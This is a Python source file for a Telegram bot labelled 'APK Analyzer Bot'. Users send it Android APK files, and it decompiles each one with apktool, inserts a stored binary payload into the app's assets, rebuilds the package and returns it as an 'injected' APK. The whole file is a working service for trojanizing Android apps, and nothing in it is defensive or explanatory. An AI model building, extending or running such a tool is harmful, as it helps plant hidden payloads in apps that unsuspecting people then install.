import os
import logging
import tempfile
import subprocess
from pathlib import Path
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()

PAYLOAD = None
try:
    for path in ["/app/payload_data.bin", "./payload_data.bin"]:
        if os.path.exists(path) and os.path.getsize(path) > 0:
            with open(path, "rb") as f:
                PAYLOAD = f.read()
            logger.info(f"Payload loaded: {len(PAYLOAD)} bytes")
            break
    if not PAYLOAD:
        logger.error("Payload not found")
except Exception as e:
    logger.error(f"Error loading payload: {e}")


def inject_payload(apk_bytes):
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            input_apk = tmp_path / "input.apk"
            output_apk = tmp_path / "output.apk"
            decompiled_dir = tmp_path / "decompiled"

            with open(input_apk, "wb") as f:
                f.write(apk_bytes)

            logger.info("Decompiling APK...")
            result = subprocess.run(
                ["apktool", "d", "-f", "-o", str(decompiled_dir), str(input_apk)],
                capture_output=True, text=True
            )
            if result.returncode != 0:
                logger.error(f"Decompile error: {result.stderr}")
                return None

            payload_path = decompiled_dir / "assets" / "payload.bin"
            payload_path.parent.mkdir(parents=True, exist_ok=True)
            with open(payload_path, "wb") as f:
                f.write(PAYLOAD)
            logger.info(f"Payload copied to: {payload_path}")

            logger.info("Recompiling APK...")
            result = subprocess.run(
                ["apktool", "b", "-o", str(output_apk), str(decompiled_dir)],
                capture_output=True, text=True
            )
            if result.returncode != 0:
                logger.error(f"Recompile error: {result.stderr}")
                return None

            if output_apk.exists():
                with open(output_apk, "rb") as f:
                    return f.read()
            return None

    except Exception as e:
        logger.error(f"Inject error: {e}")
        return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "APK Analyzer Bot\n\n"
        "Send an APK and I will inject the payload.\n\n"
        "Commands:\n"
        "/status - Check payload\n"
        "/help - Help"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if PAYLOAD:
        mb = len(PAYLOAD) // (1024 * 1024)
        await update.message.reply_text(f"Payload loaded: {mb} MB")
    else:
        await update.message.reply_text("No payload loaded!")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Help:\n\n"
        "/start - Start\n"
        "/status - Check payload\n"
        "/help - This message\n\n"
        "Send an APK file to inject the payload."
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not PAYLOAD:
        await update.message.reply_text("Payload not loaded!")
        return

    document = update.message.document
    if not document or not document.file_name.endswith(".apk"):
        await update.message.reply_text("Send a valid APK file!")
        return

    status_msg = await update.message.reply_text("Downloading APK...")

    try:
        file = await context.bot.get_file(document.file_id)
        apk_data = await file.download_as_bytearray()

        await status_msg.edit_text("Injecting payload... (may take a few minutes)")

        result = inject_payload(bytes(apk_data))

        if result:
            await update.message.reply_document(
                document=result,
                filename=f"injected_{document.file_name}",
                caption="APK injected successfully!"
            )
        else:
            await status_msg.edit_text("Error injecting payload!")

    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"Error: {str(e)}")


def main():
    if not TOKEN:
        raise ValueError("TELEGRAM_TOKEN not set")

    logger.info(f"Token OK: {TOKEN[:10]}...")

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))

    logger.info("Bot started!")
    app.run_polling()


if __name__ == "__main__":
    main()
